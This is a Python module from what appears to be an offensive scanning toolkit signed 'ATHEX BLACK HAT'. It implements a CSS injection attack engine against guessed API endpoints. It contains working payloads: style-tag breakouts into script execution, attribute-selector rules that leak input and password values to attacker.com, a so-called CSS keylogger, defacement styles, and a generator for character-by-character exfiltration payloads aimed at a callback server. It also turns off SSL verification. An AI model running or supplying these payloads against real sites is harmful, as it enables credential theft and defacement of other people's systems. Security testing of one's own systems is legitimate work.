# modules/attacks/css_injection.py

"""
CSS Injection Attack Engine
Author: ATHEX BLACK HAT
Team: Wolf Intelligence PK
Version: 1.0.0

Tests for CSS injection vulnerabilities enabling
data exfiltration, content manipulation, and
cross-origin CSS attacks.
"""

import re
from typing import Dict, List, Any, Optional
from dataclasses import dataclass, field

import requests
from requests.exceptions import RequestException


@dataclass
class CSSInjectionResult:
    """Represents a CSS injection test result."""
    url: str
    parameter: str
    payload: str
    injection_context: str
    css_reflected: bool
    data_exfiltration_possible: bool
    vulnerability_found: bool
    description: str
    evidence: Dict[str, Any]


class CSSInjection:
    """
    CSS injection attack engine.
    
    Tests for CSS injection vulnerabilities in style
    parameters, custom CSS fields, and inline styles.
    """
    
    CSS_PAYLOADS = {
        'basic_injection': [
            '}</style><script>alert(1)</script><style>',
            '}</style><img src=x onerror=alert(1)><style>',
            'body{background:red}',
            '*{display:none}',
        ],
        'data_exfiltration': [
            'input[value^="a"]{background:url(http://attacker.com/exfil?a)}',
            'input[type="password"][value^="a"]{background:url(http://attacker.com/a)}',
            '@import url(http://attacker.com/import)',
        ],
        'keylogger': [
            'input[type="password"]{background-image:url(http://attacker.com/keylog)}',
        ],
        'content_manipulation': [
            'body::before{content:"SITE HACKED";font-size:100px;color:red}',
            'body{display:none}',
            '.login-form{visibility:hidden}',
        ],
        'unicode_bypass': [
            '\\0070\\006f\\0073\\0069\\0074\\0069\\006f\\006e:fixed',
            '\\0062\\0061\\0063\\006b\\0067\\0072\\006f\\0075\\006e\\0064:red',
        ],
    }
    
    CSS_PROPERTIES = [
        'css', 'style', 'color', 'background',
        'font', 'theme', 'stylesheet', 'custom_css',
        'css_text', 'inline_style', 'design',
    ]
    
    def __init__(
        self,
        target: str,
        config: Optional[Dict[str, Any]] = None
    ):
        """
        Initialize the CSS injection tester.
        
        Args:
            target: Target URL
            config: Configuration dictionary
        """
        self.target = target
        self.config = config or {}
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
        })
        
        self.timeout = self.config.get('timeout', 30)
        self.verify_ssl = self.config.get('verify_ssl', False)
        self.callback_server = self.config.get('callback_server', 'attacker.com')
        
        self.results: List[CSSInjectionResult] = []
        self.errors: List[str] = []
    
    def detect_injection_context(
        self,
        response_text: str,
        payload: str
    ) -> str:
        """
        Detect the context where CSS is injected.
        
        Args:
            response_text: HTTP response text
            payload: Injected payload
            
        Returns:
            Context string
        """
        if f'<style>{payload}</style>' in response_text:
            return 'style_tag'
        
        if f'style="{payload}"' in response_text:
            return 'inline_style_attribute'
        
        if f'<style>{payload}' in response_text:
            return 'style_tag_open'
        
        if f'<link rel="stylesheet" href="{payload}">' in response_text:
            return 'stylesheet_link'
        
        if payload in response_text:
            return 'reflected_in_page'
        
        return 'unknown'
    
    def test_injection(
        self,
        url: str,
        parameter: str,
        payload: str,
        injection_type: str
    ) -> CSSInjectionResult:
        """
        Test CSS injection vulnerability.
        
        Args:
            url: Target URL
            parameter: Vulnerable parameter
            payload: CSS injection payload
            injection_type: Type of CSS injection
            
        Returns:
            CSSInjectionResult object
        """
        try:
            data = {parameter: payload}
            
            response = self.session.post(
                url,
                data=data,
                timeout=self.timeout,
                verify=self.verify_ssl
            )
            
            response_text = response.text
            
            css_reflected = payload in response_text
            
            context = 'unknown'
            if css_reflected:
                context = self.detect_injection_context(response_text, payload)
            
            data_exfiltration = False
            if css_reflected and '@import' in payload:
                data_exfiltration = True
            elif css_reflected and 'background:url(' in payload:
                data_exfiltration = True
            
            vulnerability_found = css_reflected
            
            result = CSSInjectionResult(
                url=url,
                parameter=parameter,
                payload=payload,
                injection_context=context,
                css_reflected=css_reflected,
                data_exfiltration_possible=data_exfiltration,
                vulnerability_found=vulnerability_found,
                description=f'CSS injection ({injection_type}) via {parameter}: {payload[:80]}',
                evidence={
                    'context': context,
                    'reflected': css_reflected,
                    'exfiltration': data_exfiltration,
                    'response_size': len(response_text),
                }
            )
            
            self.results.append(result)
            return result
            
        except RequestException as e:
            self.errors.append(f"CSS injection test failed: {str(e)}")
            
            return CSSInjectionResult(
                url=url,
                parameter=parameter,
                payload=payload,
                injection_context='error',
                css_reflected=False,
                data_exfiltration_possible=False,
                vulnerability_found=False,
                description=f'Error: {str(e)}',
                evidence={}
            )
    
    def test_stylesheet_import(self, url: str) -> List[CSSInjectionResult]:
        """
        Test for stylesheet import injection.
        
        Args:
            url: Target URL
            
        Returns:
            List of CSSInjectionResult objects
        """
        results = []
        
        import_payloads = [
            f'@import url(http://{self.callback_server}/test);',
            f'@import url(//{self.callback_server}/test);',
        ]
        
        style_endpoints = [
            '/api/theme', '/api/style', '/api/css',
            '/api/design', '/api/customize',
        ]
        
        for endpoint in style_endpoints:
            full_url = f"{self.target.rstrip('/')}{endpoint}"
            
            for payload in import_payloads:
                try:
                    data = {'css': payload, 'style': payload, 'theme': payload}
                    
                    response = self.session.post(
                        full_url,
                        json=data,
                        timeout=self.timeout,
                        verify=self.verify_ssl
                    )
                    
                    css_reflected = payload in response.text
                    
                    result = CSSInjectionResult(
                        url=full_url,
                        parameter='css/theme',
                        payload=payload,
                        injection_context='stylesheet' if css_reflected else 'none',
                        css_reflected=css_reflected,
                        data_exfiltration_possible=css_reflected,
                        vulnerability_found=css_reflected,
                        description=f'Stylesheet import injection: {payload}',
                        evidence={
                            'reflected': css_reflected,
                            'endpoint': full_url,
                        }
                    )
                    
                    results.append(result)
                    
                except RequestException:
                    continue
        
        self.results.extend(results)
        return results
    
    def generate_exfiltration_payload(
        self,
        target_attribute: str = 'value',
        callback_url: Optional[str] = None
    ) -> str:
        """
        Generate CSS data exfiltration payload.
        
        Args:
            target_attribute: HTML attribute to exfiltrate
            callback_url: Callback URL for exfiltration
            
        Returns:
            CSS exfiltration payload
        """
        server = callback_url or self.callback_server
        
        chars = 'abcdefghijklmnopqrstuvwxyz0123456789'
        payloads = []
        
        for char in chars:
            payloads.append(
                f'input[{target_attribute}^="{char}"]{{'
                f'background:url(http://{server}/exfil?c={char})}}'
            )
        
        return '\n'.join(payloads)
    
    def test_blind_css_injection(self, url: str) -> List[CSSInjectionResult]:
        """
        Test for blind CSS injection vulnerabilities.
        
        Args:
            url: Target URL
            
        Returns:
            List of CSSInjectionResult objects
        """
        results = []
        
        blind_payload = f'@import url(http://{self.callback_server}/blind_css_test);'
        
        common_endpoints = [
            f"{self.target}/api/profile",
            f"{self.target}/api/settings",
            f"{self.target}/api/theme",
        ]
        
        for endpoint in common_endpoints:
            for param in self.CSS_PROPERTIES[:5]:
                try:
                    data = {param: blind_payload}
                    
                    response = self.session.post(
                        endpoint,
                        json=data,
                        timeout=self.timeout,
                        verify=self.verify_ssl
                    )
                    
                    if response.status_code in [200, 201, 202]:
                        result = CSSInjectionResult(
                            url=endpoint,
                            parameter=param,
                            payload=blind_payload,
                            injection_context='blind',
                            css_reflected=False,
                            data_exfiltration_possible=True,
                            vulnerability_found=True,
                            description=f'Blind CSS injection via {param} at {endpoint}',
                            evidence={
                                'endpoint': endpoint,
                                'parameter': param,
                                'status_code': response.status_code,
                            }
                        )
                        
                        results.append(result)
                        
                except RequestException:
                    continue
        
        self.results.extend(results)
        return results
    
    def run(self) -> Dict[str, Any]:
        """
        Run all CSS injection tests.
        
        Returns:
            Dictionary with test results
        """
        test_endpoints = [
            f"{self.target}/api/profile",
            f"{self.target}/api/settings",
            f"{self.target}/api/theme",
            f"{self.target}/api/customize",
        ]
        
        for endpoint in test_endpoints:
            for prop in self.CSS_PROPERTIES[:3]:
                for payload in self.CSS_PAYLOADS['basic_injection']:
                    self.test_injection(endpoint, prop, payload, 'basic')
                
                for payload in self.CSS_PAYLOADS['content_manipulation']:
                    self.test_injection(endpoint, prop, payload, 'content_manipulation')
        
        self.test_stylesheet_import(self.target)
        self.test_blind_css_injection(self.target)
        
        findings = []
        for result in self.results:
            if result.vulnerability_found:
                severity = 'medium'
                if result.data_exfiltration_possible:
                    severity = 'high'
                
                findings.append({
                    'type': f'CSS Injection: {result.injection_context}',
                    'severity': severity,
                    'endpoint': result.url,
                    'parameter': result.parameter,
                    'payload': result.payload,
                    'description': result.description,
                    'evidence': result.evidence,
                    'remediation': 'Validate and sanitize CSS input. '
                                   'Use Content-Security-Policy headers. '
                                   'Implement CSS whitelist for allowed properties. '
                                   'Use a CSS parser to validate input structure.',
                })
        
        return {
            'findings': findings,
            'errors': self.errors,
            'parameters_tested': len(self.CSS_PROPERTIES),
            'total_tests': len(self.results),
            'vulnerabilities_found': len(findings),
            'exfiltration_payload': self.generate_exfiltration_payload(),
        }